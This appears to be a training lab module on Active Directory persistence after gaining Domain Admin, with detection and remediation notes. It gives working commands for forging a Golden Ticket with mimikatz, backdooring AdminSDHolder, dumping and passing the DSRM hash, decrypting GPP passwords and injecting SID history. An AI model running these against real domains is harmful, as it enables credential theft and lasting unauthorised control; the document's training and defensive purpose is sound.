# 07 — Persistence

## Overview

After gaining Domain Admin, plant backdoors that survive password resets and detection attempts.

---

## 1. Golden Ticket

Forge TGTs using the `krbtgt` account hash. Valid for 10 years by default.

```powershell
# Step 1: Dump krbtgt hash via DCSync
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
# Note: NTLM hash and domain SID

# Step 2: Get domain SID
Get-ADDomain | Select-Object DomainSID

# Step 3: Forge a Golden Ticket
.\mimikatz.exe "kerberos::golden /user:BackdoorAdmin /domain:corp.local /sid:S-1-5-21-XXXXXXXXX /krbtgt:<HASH> /groups:512 /ptt" exit

# Verify
klist
dir \\DC-01.corp.local\C$
```

**Survival:** Survives admin password resets. Invalidated only when `krbtgt` password is rotated twice.

---

## 2. AdminSDHolder Persistence

Modify the AdminSDHolder object ACL. Every 60 minutes, SDProp propagates these ACLs to all protected accounts (Domain Admins, Enterprise Admins, etc.).

```powershell
# Grant svc_backup GenericAll on AdminSDHolder
# (already configured by Setup-CorpLocal.ps1)

# Verify: after 60 min, svc_backup should have GenericAll over all DAs
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -eq "svc_backup"
}

# Exploit: use svc_backup to reset any DA's password
Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString "Hacked!" -AsPlainText -Force)
```

**Survival:** Persists through DA removals. Must remove the ACE from AdminSDHolder itself to clean.

---

## 3. DSRM Abuse

The DSRM (Directory Services Restore Mode) local administrator password is set during DC promotion. With `DsrmAdminLogonBehavior = 2`, this local admin can log in over the network.

```powershell
# Verify DSRM is enabled (already set by setup script)
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior
# Expected: 2

# Dump the DSRM hash via mimikatz (as DA)
.\mimikatz.exe "token::elevate" "lsadump::sam" exit
# Note the Administrator (RID 500) NTLM hash — this is the DSRM hash

# Pass-the-hash with DSRM credentials
# The DSRM admin is local to DC-01, so use .\Administrator or DC-01\Administrator
secretsdump.py -hashes :<DSRM_HASH> DC-01\Administrator@192.168.56.10
```

**Survival:** Survives domain password policy. Must change DSRM password separately per DC.

---

## 4. GPP / SYSVOL Password

Group Policy Preferences stored passwords (cpassword) in SYSVOL are encrypted with a published AES key. Any domain user can read SYSVOL and decrypt.

```powershell
# Find Groups.xml files in SYSVOL
Get-ChildItem -Path "\\corp.local\SYSVOL" -Recurse -Include "Groups.xml" -ErrorAction SilentlyContinue |
    Select-String "cpassword"

# Decrypt with PowerView
Get-GPPPassword

# Decrypt with CrackMapExec
crackmapexec smb 192.168.56.10 -u attacker.01 -p p@ssw0rd -M gpp_password
```

**Survival:** Persists in SYSVOL until manually removed.

---

## 5. SID History Abuse

Add a privileged domain's SID to a dev.corp.local account's SID history. When that account authenticates to corp.local, the SID is included in the Kerberos PAC and grants access.

```powershell
# Requires DA in dev.corp.local

# Add corp.local Enterprise Admins SID to dev.backdoor
Get-ADUser dev.backdoor -Properties SIDHistory
$EASid = (Get-ADGroup -Server corp.local -Identity "Enterprise Admins").SID
# Use mimikatz to inject SID history (requires DA + replication rights)
.\mimikatz.exe "privilege::debug" "sid::add /sam:dev.backdoor /new:$EASid" exit

# dev.backdoor now has Enterprise Admin rights in corp.local
```

**Survival:** Persists until SID history is explicitly cleared.

---

## Detection

| Technique          | Detection                                          |
|--------------------|----------------------------------------------------|
| Golden Ticket      | Event 4769 with unusual account names              |
| AdminSDHolder      | Event 5136 on CN=AdminSDHolder                     |
| DSRM Abuse         | Event 4648 (explicit logon) on DCs                 |
| GPP Passwords      | Remove Groups.xml from SYSVOL; alert on reads      |
| SID History        | Event 4765/4766; monitor sidHistory attribute      |

## Remediation

- Rotate `krbtgt` password **twice** to invalidate all Golden Tickets
- Remove malicious ACEs from AdminSDHolder
- Set `DsrmAdminLogonBehavior = 0`; change DSRM password
- Delete Groups.xml from SYSVOL; disable GPP password caching
- Audit SID History on all accounts
